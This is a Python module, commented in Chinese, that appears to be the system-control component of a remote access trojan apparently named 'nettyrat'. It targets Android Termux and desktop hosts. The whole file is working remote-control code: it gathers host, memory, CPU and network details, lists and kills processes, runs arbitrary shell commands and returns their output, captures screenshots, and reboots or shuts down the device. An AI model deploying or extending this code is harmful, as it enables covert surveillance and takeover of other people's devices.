#!/usr/bin/env python3
"""系统控制模块 (Termux兼容版)"""
import os
import sys
import platform
import subprocess
import socket
from datetime import datetime
from typing import Optional

class SystemModule:
    """系统控制 - Termux 兼容"""

    def __init__(self):
        self.hostname = socket.gethostname()
        self.is_termux = os.path.exists("/data/data/com.termux")

    def info(self) -> str:
        """获取系统信息"""
        try:
            import psutil
            mem = psutil.virtual_memory()
            memory_info = f"{mem.used // (1024**3)}GB / {mem.total // (1024**3)}GB ({mem.percent}%)"
            cpu_info = f"{psutil.cpu_percent(interval=1)}%"
        except:
            memory_info = "N/A (psutil 未安装)"
            cpu_info = "N/A"

        info = f"""
📊 **系统信息**
━━━━━━━━━━━━━━━━━━━━━
🖥️ 主机名: `{self.hostname}`
💻 平台: `{platform.system()} {platform.release()}`
⚙️ 架构: `{platform.machine()}`
📱 Termux: `{'是' if self.is_termux else '否'}`

📈 **资源使用**
━━━━━━━━━━━━━━━━━━━━━
💾 内存: `{memory_info}`
🔥 CPU: `{cpu_info}`

🌐 **网络**
━━━━━━━━━━━━━━━━━━━━━
{self._get_network_info()}
"""
        return info

    def _get_network_info(self) -> str:
        try:
            import psutil
            interfaces = []
            for name, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces.append(f"• `{name}`: `{addr.address}`")
            return "\n".join(interfaces) or "无网络接口"
        except:
            # 使用 ifconfig 回退
            try:
                result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=5)
                return f"```\n{result.stdout[:500]}\n```"
            except:
                return "无法获取网络信息"

    def processes(self, limit: int = 15) -> str:
        """列出进程"""
        try:
            import psutil
            procs = []
            for p in sorted(psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']),
                           key=lambda x: x.info['cpu_percent'] or 0, reverse=True)[:limit]:
                try:
                    procs.append(
                        f"`{p.info['pid']:>6}` | `{p.info['name'][:20]:<20}` | "
                        f"CPU:{p.info['cpu_percent'] or 0:>5.1f}%"
                    )
                except:
                    continue
            return "📋 **进程列表**\n━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(procs)
        except:
            # 使用 ps 回退
            try:
                result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
                lines = result.stdout.strip().split('\n')[:limit+1]
                return "📋 **进程列表**\n━━━━━━━━━━━━━━━━━━━━━\n```\n" + "\n".join(lines) + "\n```"
            except:
                return "❌ 无法获取进程列表"

    def kill(self, pid: int) -> str:
        """结束进程"""
        try:
            os.kill(pid, 9)
            return f"✅ 已终止进程 `{pid}`"
        except Exception as e:
            return f"❌ 错误: `{str(e)}`"

    def shell(self, command: str, timeout: int = 30) -> str:
        """执行 Shell 命令"""
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True,
                timeout=timeout, cwd=os.getcwd()
            )
            output = result.stdout + result.stderr
            if not output.strip():
                return "✅ 命令执行成功 (无输出)"
            return f"```\n{output[:4000]}\n```"
        except subprocess.TimeoutExpired:
            return "⏱️ 命令执行超时"
        except Exception as e:
            return f"❌ 错误: `{str(e)}`"

    def screenshot(self, quality: int = 85) -> Optional[bytes]:
        """屏幕截图"""
        try:
            if self.is_termux:
                # Termux: 使用 screencap
                result = subprocess.run(
                    ["screencap", "-p", "/sdcard/nettyrat_screen.png"],
                    capture_output=True, timeout=10
                )
                if result.returncode == 0:
                    with open("/sdcard/nettyrat_screen.png", "rb") as f:
                        return f.read()
                return None
            else:
                # 标准环境
                try:
                    from PIL import Image
                    import io
                    result = subprocess.run(
                        ["scrot", "-q", str(quality), "-"],
                        capture_output=True, timeout=10
                    )
                    if result.returncode == 0:
                        return result.stdout
                except:
                    pass

                import pyautogui
                img = pyautogui.screenshot()
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=quality)
                return buf.getvalue()
        except Exception as e:
            print(f"Screenshot error: {e}")
            return None

    def reboot(self) -> str:
        os.system("reboot" if not self.is_termux else "termux-reload-settings")
        return "🔄 重启中..."

    def shutdown(self) -> str:
        if self.is_termux:
            return "⚠️ Termux 不支持关机"
        os.system("shutdown -h now")
        return "🔴 关机中..."
